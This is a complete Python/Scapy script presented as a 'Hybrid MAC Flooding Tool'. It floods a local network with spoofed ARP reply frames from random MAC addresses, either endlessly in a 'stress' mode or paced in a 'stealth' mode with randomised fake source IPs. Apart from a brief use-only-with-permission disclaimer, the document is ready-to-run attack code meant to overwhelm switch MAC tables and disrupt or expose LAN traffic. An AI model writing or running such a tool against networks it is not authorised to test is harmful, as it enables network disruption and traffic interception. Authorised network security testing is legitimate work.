from scapy.all import *
import argparse
import random
import time
import sys

def disclaimer():
    print("""
    ==========================================
    ⚠️  DISCLAIMER
    This script is for educational and testing purposes only.
    The author is not responsible for any misuse or illegal activity.
    Use only in environments you own or have explicit permission to test.
    ==========================================
    """)

def send_mac_flood_stress(iface):
    print("[*] Starting STRESS mode MAC flooding...")
    try:
        while True:
            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / \
                  ARP(op=2, psrc="0.0.0.0", hwdst="ff:ff:ff:ff:ff:ff") / \
                  Padding(load="X" * 18)
            sendp(pkt, iface=iface, verbose=False)
    except KeyboardInterrupt:
        print("\n[!] Stopped stress flooding.")

def send_mac_flood_stealth(iface, delay, count):
    print(f"[*] Starting STEALTH mode: {count} packets, {delay}s delay...")
    try:
        for i in range(count):
            fake_ip = f"192.168.1.{random.randint(2,254)}"
            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / \
                  ARP(op=2, psrc=fake_ip, hwdst="ff:ff:ff:ff:ff:ff") / \
                  Padding(load="S" * 18)
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(delay)
        print("[*] Stealth attack complete.")
    except KeyboardInterrupt:
        print("\n[!] Stealth attack interrupted.")

if __name__ == "__main__":
    disclaimer()

    parser = argparse.ArgumentParser(description="Hybrid MAC Flooding Tool (Stress & Stealth Modes)")
    parser.add_argument("-i", "--interface", required=False, default=conf.iface, help="Network interface (default: auto-detected)")
    parser.add_argument("-m", "--mode", choices=["stress", "stealth"], default="stress", help="Attack mode (stress or stealth)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between packets in stealth mode")
    parser.add_argument("-c", "--count", type=int, default=50, help="Packet count in stealth mode")

    args = parser.parse_args()

    if args.mode == "stress":
        send_mac_flood_stress(args.interface)
    else:
        send_mac_flood_stealth(args.interface, args.delay, args.count)
